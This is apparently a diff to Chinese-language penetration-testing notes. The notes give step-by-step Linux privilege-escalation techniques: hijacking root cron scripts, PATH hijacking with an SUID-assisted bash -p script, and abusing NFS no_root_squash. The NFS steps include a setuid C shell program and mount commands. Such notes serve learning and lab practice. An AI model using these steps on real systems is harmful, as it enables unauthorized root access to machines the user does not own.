@@ -151,3 +151,81 @@
 > getcap -r / 2>/dev/null
 
 根据显示的功能到[gtfobins](https://gtfobins.github.io/)查找对应的```Capabilities```的提权方法
+
+
+# Cron
+
+思路：
+如果有一个以 root 权限运行的计划任务，并且我们可以更改将要运行的脚本，那么我们的脚本将以 root 权限运行
+
+查看Cron任务：
+> /etc/crontab
+
+# PATH
+
+路径提权需要结合SUID进行
+
+## 步骤
+
+1. 查看当前环境变量PATH：
+> echo $PATH
+
+2. 查找系统可写文件夹以便加入到$PATH（一般选择/tmp或者当前用户家目录）
+> find / -writable 2>/dev/null
+
+3. 把某个目录加入到$PATH
+> export PATH=/tmp:$PATH
+
+4. 把下面shell写进需要劫持的命令：
+```
+#!/bin/bash
+/bin/bash -p
+```
+
+5. 执行劫持的命令，，获得root权限
+
+# NFS
+
+## 思路
+1. NFS（网络文件共享）配置保存在 ```/etc/exports``` 文件中。该文件是在 NFS 服务器安装期间创建的，通常可以由用户读取
+查看：
+> cat  /etc/exports
+
+2. 关键元素是可以在上面看到的```no_root_squash```选项
+3. 默认情况下，NFS 会将 root 用户更改为 nfsnobody 并剥夺任何文件以 root 权限运行。如果“no_root_squash”选项存在于可写共享中，我们可以创建一个设置了 SUID 位的可执行文件并在目标系统上运行它.
+
+简单点来说就是因为靶机的错误分享配置，导致攻击机挂载上去以后创建的任何文件都能够以root的身份和权限运行。
+
+## 步骤
+1. 在靶机查看 ```/etc/exports```
+> cat /etc/exports
+
+2. 检查上面分享文件是否存在```no_root_squash```选项
+
+3. 在攻击机查看靶机的分享目录
+> showmount -e 靶机IP
+
+4. 在攻击机```/tmp/```目录下创建一个文件夹
+> mkdir /tmp/expnfs
+
+5. 把靶机有```no_root_squash```选项的文件夹挂载到攻击机上
+> mount -o rw 靶机IP：/靶机共享文件夹  /tmp/expnfs  
+> 例子：mount -o rw 10.0.2.12:/backups  /tmp/expnfs)
+
+6. 创建一个c程序，把如下代码写进去。（奇怪的是创建一个shell脚本是不行的。。）
+```
+int main(){
+setgid(0);
+setuid(0);
+system("/bin/bash");
+return 0;
+}
+
+```
+
+7. 在攻击机挂载目录上编译上面的c程序
+```
+gcc nfs.x -o nfs -w
+```
+
+8. 此时回到靶机的分享目录，就可以看见上面的nfs二进制文件，并且具有SUID权限，执行即可提权
